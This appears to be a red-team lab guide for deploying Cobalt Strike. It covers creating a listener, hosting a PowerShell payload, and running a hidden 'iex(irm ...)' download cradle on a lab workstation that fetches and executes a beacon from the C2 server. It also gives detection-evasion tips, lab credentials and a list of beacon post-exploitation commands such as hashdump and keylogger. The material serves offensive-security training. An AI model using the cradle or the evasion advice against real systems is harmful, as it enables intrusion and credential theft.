
### Objectives

    Review the features of Cobalt Strike
    Create a listener
    Create a payload and host it on the C2 server
    Execute the payload in the target environment
    Interact with the Beacon
    Explore Cobalt Strike modules

## Overview 

The cobalt strike client can be found on the student instance, which can be reached via guacamole only. The credentials are:

    url: http://10.130.2.22:8080/guacamole
    username: student
    password: Sec565!!

##### Installation
1. Start the Cobalt Strike client by navigating to C:\Tools\cobaltstrike and double clicking the cobaltstrike application.

![[Pasted image 20240130225807.png]]

2. In the client please fill in the following values:
    `Host:` 10.130.4.100
    Select a username that you really like (or keep Neo)
    As password, please fill in the following sec565@!

3. If everything looks OK, click the Connect button. 

![[Pasted image 20240130225923.png]]
### Create an Cobalt Strike listener
A command and control server is useless if we do not listen for new incoming connections, Let's fix that right now. In this guide we are looking at easiest example to setup a Listener and Launcher/Payload

In Cobalt Strike there are multiple ways to setup a listener:
1.  Click Headphone icon on menu or Click on Cobalt Strike on the top of the menu and then select Listeners. 
2. A new tab is now going to open in the bottom half of your client called Listeners, go ahead and click the Add button.
	1. `Name:` The name of the listener, pick something descriptive for example HTTPS-Short or DNS-Long
	2. `Payload:` This is what type of payload the listener should expect, there are a bunch of options here as Cobalt Strike supports:
        - `Peer-to-peer` connections over `TCP` or `SMB`.
        - Can communicate to the internet over `DNS, HTTP or HTTPS`.
        - There is also support for metasploit through `Foreign` listeners
        - Finally, the concept of `externalC2` which allows you to create your own command and control channel that will interface with Cobalt Strike.

###### Host Rotation 
Cobalt Strike supports host rotation as well, This will make sure that the beacon will rotate hosts on a predefined set of rules.
- It can be set to Random or set as a fallback mechanism. 
- Not only does this help reduce indicators of compromise as the beacon will not phone home to the same IP all the time, it also makes it more robust in case one of your IPs or domain names get blacklisted. 

![[Pasted image 20240130231227.png]]

3. Press the Save button, if all went well a new Listener should be registered and visible in the Listeners tab.
![[Pasted image 20240130231443.png]]
### Create a Launcher payload
Cobalt Strike supports multiple file extensions to generate payloads, ranging from binaries to raw shellcode to PowerShell scripts and yes... even Macros! 

The easiest way to infect a victim is by execution of a PowerShell Script:
1. Navigating to the Attacks tab in the top of your client and selecting `Scripted Web Delivery (S)`
	1. Note:  Cobalt Strike Allows you to generate a malicious script to execute Beacon and host it on the Cobalt Strike server at the same time. *Check OPSEC Tip Below*
2. Please check and fill in the following values:
![[Pasted image 20240130232846.png]]
3. A new Dialogue should appear with the url that you can copy paste. We can also automatically copy the URL back to your clipboard by going to `Site Management -> Manage` on top of your Cobalt Strike Client


*Red Team Tip: It is not smart to take the approach we are showing in this exercise in a stealthy red team.
- *Hosting a malicious PowerShell script directly on the server exposes the IP of the server in case the SOC catches wind of your engagement.
- *A better way to do this would be to have a separate "staging" server that is hardened for example using rewrite conditions based on URL and user agents, it is also smart to modify the generated script so static detections can be bypassed. For example leveraging AWS s3 bucket

### Deliver Beacon  
Time to launch our Beacon. please rdp into wk01 by opening up a terminal on your slingshot
```
xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp
```
1. Open a command prompt by clicking the windows icon in the lower left and typing cmd.exe. Then paste the download cradle 
2. `powershell.exe -nop -w hidden -c "iex(irm -useb http://10.130.4.100:8888/WindowsUpdate)"`
3. The window should disappear and a new beacon should check in and register on the C2.
![[Pasted image 20240130233038.png]]
### Interacting with our beacon 

4. Double click on the Beacon in your Cobalt Strike client, a new Beacon tab will open up on the bottom half of the client.
5. In this window, you can execute commands to interact with the beacon. Cobalt strike has a lot of built in commands, let's list them by simply typing a `?` in the `beacon>` window then pressing enter.

The full output of the command is listed below, for future reference: 
```
beacon> ?

Beacon Commands
===============

    Command                   Description
    -------                   -----------
    !                         Run a command from the history
    argue                     Spoof arguments for matching processes
    blockdlls                 Block non-Microsoft DLLs in child processes
    browserpivot              Setup a browser pivot session
    cancel                    Cancel a download that's in-progress
    cd                        Change directory
    checkin                   Call home and post data
    chromedump                Recover credentials from Google Chrome
    clear                     Clear beacon queue
    clipboard                 Attempt to get text clipboard contents
    connect                   Connect to a Beacon peer over TCP
    covertvpn                 Deploy Covert VPN client
    cp                        Copy a file
    dcsync                    Extract a password hash from a DC
    desktop                   View and interact with target's desktop
    dllinject                 Inject a Reflective DLL into a process
    dllload                   Load DLL into a process with LoadLibrary()
    download                  Download a file
    downloads                 Lists file downloads in progress
    drives                    List drives on target
    elevate                   Spawn a session in an elevated context
    execute                   Execute a program on target (no output)
    execute-assembly          Execute a local .NET program in-memory on target
    exit                      Terminate the beacon session
    file_browser              Open the file browser tab for this beacon
    getprivs                  Enable system privileges on current token
    getsystem                 Attempt to get SYSTEM
    getuid                    Get User ID
    hashdump                  Dump password hashes
    help                      Help menu
    history                   Show the command history
    inject                    Spawn a session in a specific process
    inline-execute            Run a Beacon Object File in this session
    jobkill                   Kill a long-running post-exploitation task
    jobs                      List long-running post-exploitation tasks
    jump                      Spawn a session on a remote host
    kerberos_ccache_use       Apply kerberos ticket from cache to this session
    kerberos_ticket_purge     Purge kerberos tickets from this session
    kerberos_ticket_use       Apply kerberos ticket to this session
    keylogger                 Start a keystroke logger
    kill                      Kill a process
    link                      Connect to a Beacon peer over a named pipe
    logonpasswords            Dump credentials and hashes with mimikatz
    ls                        List files
    make_token                Create a token to pass credentials
    mimikatz                  Runs a mimikatz command
    mkdir                     Make a directory
    mode dns                  Use DNS A as data channel (DNS beacon only)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
    mv                        Move a file
    net                       Network and host enumeration tool
    note                      Assign a note to this Beacon       
    portscan                  Scan a network for open services
    powerpick                 Execute a command via Unmanaged PowerShell
    powershell                Execute a command via powershell.exe
    powershell-import         Import a powershell script
    ppid                      Set parent PID for spawned post-ex jobs
    printscreen               Take a single screenshot via PrintScr method
    process_browser           Open the process browser tab for this beacon
    ps                        Show process list
    psinject                  Execute PowerShell command in specific process
    pth                       Pass-the-hash using Mimikatz
    pwd                       Print current directory
    reg                       Query the registry
    remote-exec               Run a command on a remote host
    rev2self                  Revert to original token
    rm                        Remove a file or folder
    rportfwd                  Setup a reverse port forward
    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
    run                       Execute a program on target (returns output)
    runas                     Execute a program as another user
    runasadmin                Execute a program in an elevated context
    runu                      Execute a program under another PID
    screenshot                Take a single screenshot
    screenwatch               Take periodic screenshots of desktop
    setenv                    Set an environment variable
    shell                     Execute a command via cmd.exe
    shinject                  Inject shellcode into a process
    shspawn                   Spawn process and inject shellcode into it
    sleep                     Set beacon sleep time
    socks                     Start/Stop a SOCKS4a/SOCKS5 server to relay traffic
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes into
    spawnu                    Spawn a session under another process
    spunnel                   Spawn and tunnel an agent via rportfwd
    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
    ssh                       Use SSH to spawn an SSH session on a host
    ssh-key                   Use SSH to spawn an SSH session on a host
    steal_token               Steal access token from a process
    timestomp                 Apply timestamps from one file to another
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file
    windows_error_code        Show the Windows error code for a Windows error code number

```

###### Default Config + Malleaable Profile
- When not using a Malleable Profile (a file that can change the way Cobalt Strike beacons behave, that has to be set on the server side.), Cobalt Strike falls back to default values. 
- By default, Cobalt Strike beacons will sleep for 1 minute, for the sake of this lab, let's change that behavior and make our shorthaul interactive for a while. 
	- Make Beacon interactive by reducing shorthaul - `beacon> sleep 0`


### Modules 


## Research | Bonus

[Malleable-C2-Profiles](https://github.com/BC-SECURITY/Malleable-C2-Profiles)

[GraphStrike: Cobalt Strike HTTPS beaconing over Microsoft Graph API](https://github.com/RedSiege/GraphStrike)

## Conclusion
- In this lab we explored another command and control framework. 
- We created a listener and a PowerShell launcher. 
	- We RDP directly into the environment and used a download cradle to retrieve and execute our launcher. 
	- We explored a few of the tasks/modules that the framework provides including how to transform our shorthaul into an interactive haul instead.


